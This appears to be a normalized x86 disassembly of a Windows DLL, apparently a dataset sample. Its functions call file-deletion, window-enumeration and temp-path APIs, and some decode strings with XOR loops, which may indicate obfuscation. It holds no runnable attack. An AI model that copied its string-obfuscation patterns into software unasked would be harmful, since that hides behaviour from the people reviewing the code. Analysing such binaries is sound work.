xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x88 ]
fld [ ebp + 0x1c ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1004be60
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005296
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1004be90
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
xor eax eax
pop esi
retn
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_1004beba
push 0xc
push r--data
call sub_10079bf0
call sub_10039c8c
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1003bcad
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004bf27
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10039c8c
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10079c35
retn
push 0x20
call sub_1006818d
sub_1004bf40
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push 0x0
lea edx [ edi + 0x4 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ecx ] 0x0
call sub_100417c0
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x28 ]
mov [ esi + 0x28 ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
mov ecx [ edi + 0x30 ]
mov [ esi + 0x30 ] ecx
mov edx [ edi + 0x34 ]
mov [ esi + 0x34 ] edx
mov al [ edi + 0x38 ]
mov [ esi + 0x38 ] al
mov eax esi
retn
sub_1004bfa0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ EnumDesktopWindows@IAT ]
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax 0x258
jl r-xdata
push 0x64
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push esi
push sub_1004ad10
push ecx
mov [ esi ] 0x0
call ebx
cmp [ esi ] 0x0
jne r-xdata
sub_1004c020
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_1006591f
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_10040380
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_1003b2c0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_10040380
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1004c110
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add eax [ ebx + 0x4 ]
push edi
mov edi ecx
cmp edi eax
jae r-xdata
cmp edi ecx
je r-xdata
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ebx ]
add ecx [ esi ]
push edx
push eax
push ecx
call sub_100796a0
mov edx [ ebx + 0x4 ]
add esp 0xc
add [ esi + 0x4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10020380
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
mov ebx eax
push edx
push ebx
call sub_100796a0
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10035fe0
mov [ esi ] ebx
mov ebx [ ebp + 0xc ]
add esp 0x1c
mov [ esi + 0x8 ] edi
add edi edi
cmp edi eax
jb r-xdata
sub_1004c18a
push 0x38
mov eax sub_1007f941
call sub_1001bb6b
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1002b6c2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10069ce0
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004fa89
retn 0x20
sub_1004c240
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x41c ] eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test [ ebp + 0x10 ] 0x4
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ecx
push eax
mov ecx edi
call sub_10002180
add esp 0x8
test eax eax
je r-xdata
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ PathAddBackslashW@IAT ]
mov ecx [ rw-data ]
cmp [ ecx + 0xd54 ] 0x0
mov [ ebp - 0x418 ] esi
jne r-xdata
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x20c ]
mov ecx eax
xor ebx ebx
mov edx 0x104
sub esi ecx
lea esp [ esp ]
mov [ ebp - 0x418 ] ebx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp - 0x418 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x414 ]
call sub_1003d910
test eax eax
je r-xdata
pop esi
lea eax [ edx + 0x6 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push edx
mov edx edi
call sub_1003f020
add esp 0x8
neg eax
sbb eax eax
pop esi
and eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1004c42d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10022b5a
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10022b5a
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10022b5a
push [ esi + 0xc0 ]
call sub_10022b5a
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10052e0c
push [ esi + 0xd4 ]
call sub_10022b5a
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10022b5a
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10022b5a
pop ecx
push [ esi + 0xb0 ]
call sub_10022b5a
push [ esi + 0xbc ]
call sub_10022b5a
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10022b5a
push [ esi + 0xbc ]
call sub_10048e19
pop ecx
pop ecx
push eax
call sub_10022b5a
pop ecx
push eax
call sub_10022b5a
push [ esi + 0xbc ]
call sub_1003c5db
pop ecx
pop ecx
sub_1004c578
push 0x8
mov eax sub_1007ff98
call sub_1002152b
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1000a66f
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100516ef
push eax
call sub_10027fa7
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_100137fa
push eax
call sub_10027fa7
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1000a25b
mov [ esi + 0x10 ] eax
call sub_1004db01
retn 0x4
sub_1004c5f0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
imul eax [ ebp - 0x4 ]
pop edi
pop esi
and eax 0x3f
pop ebx
mov esp ebp
pop ebp
retn 0x4
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
sub_1004c6a0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ebx [ lstrcmpW@IAT ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
mov [ ebp - 0xa ] ax
mov ecx [ esi ]
mov eax [ ecx + 0xc ]
lea edx [ ebp - 0x20 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ esi ]
push edi
call sub_1006b7c0
test eax eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
lea edx [ ebp - 0x6c ]
mov eax 0xd5
call sub_10013830
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_1004c74b
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005cfc3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1004c7f0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10058a25
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1004c82c
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_1004c9d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100836fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
lea ecx [ edi + 0x3b0 ]
mov [ ebp - 0x2c4 ] edi
mov [ ebp - 0x2bc ] eax
call sub_1003c2a0
lea eax [ ebp - 0x29c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x194 ]
lea edx [ ebp - 0x29c ]
mov ecx eax
xor ebx ebx
mov esi 0x104
sub edx ecx
test esi esi
jne r-xdata
mov cl [ eax + edx ]
test cl cl
je r-xdata
mov [ eax ] 0x0
test ebx ebx
jns r-xdata
dec eax
mov ebx 0x8007007a
mov [ eax ] cl
inc eax
dec esi
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xf1
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax 0x104
lea ecx [ ebp - 0x194 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
inc ecx
dec eax
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx 0x104
sub ecx eax
lea eax [ ebp - 0x28 ]
push eax
mov eax 0x104
sub eax ecx
lea ecx [ ebp + ecx - 0x194 ]
mov edx 0x7fffffff
call sub_1006c830
test eax eax
jns r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
push 0x3039
lea ecx [ ebp - 0x194 ]
push ecx
mov esi edi
mov [ ebp - 0x2c0 ] 0x0
call sub_1004f840
test eax eax
jne r-xdata
mov edx [ ebp - 0x2bc ]
mov ebx [ edx ]
mov eax edx
mov eax [ eax + 0x4 ]
cmp ebx eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x10c
call sub_10013830
mov eax 0x3
jmp r-xdata
mov ecx edi
call sub_1004ccf0
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ edi + 0x3a0 ]
mov esi [ eax ]
push 0x2
xor ebx ebx
push ebx
push ebx
add esi 0x20
call sub_1003ed20
mov ecx [ edi + 0x3a0 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xfb
call sub_10013830
mov eax 0x8
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax [ r--data ]
mov ecx [ r--data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x2c ]
push eax
call edx
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ ebx + 0x10 ]
lea ecx [ eax + ecx * 2 ]
cmp edx 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
add edx [ ebp - 0x24 ]
mov ecx [ edi + 0x3a0 ]
push ebx
mov [ edi + 0x8 ] edx
mov esi [ ecx ]
push ebx
push ebx
add esi 0x20
call sub_1003ed20
mov edx [ edi + 0x8 ]
push edx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx eax
mov eax [ edi + 0x8 ]
cdq
push edx
push eax
mov eax [ edi + 0x3a0 ]
push ecx
mov [ edi + 0x4 ] ecx
mov ecx [ eax ]
add ecx 0x20
push ecx
call sub_10050e10
mov eax [ ebp - 0x2c0 ]
mov esi [ ebp - 0x2c4 ]
call sub_1001c590
test eax eax
jne r-xdata
lea edi [ ebp - 0x2b8 ]
mov edx [ ebp - 0x2c0 ]
push edx
push ecx
push eax
lea eax [ ebp - 0x2b8 ]
xor esi esi
push eax
mov [ ebp - 0x2a4 ] 0xf
mov [ ebp - 0x2a8 ] esi
mov [ ebp - 0x2b8 ] 0x0
call sub_1003f620
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x2a4 ] 0x10
mov edi [ ebp - 0x2b8 ]
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x2a4 ] 0x10
jb r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xab
call sub_10013830
mov [ ebp - 0x2c0 ] 0x2
mov edx [ ebp - 0x2bc ]
add ebx 0x24
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call sub_1006591f
add esp 0x4
mov edi esi
sub_1004ccf0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
cmp [ esi + 0xc ] 0x0
push edi
mov edi 0x1
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x90
call sub_10013830
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x398 ]
push eax
call ecx
add esp 0x4
test eax eax
jne r-xdata
call sub_1004b200
test eax eax
jne r-xdata
mov [ esi + 0xc ] 0x0
xor edi edi
xor edi edi
sub_1004cd80
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_1006a508
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
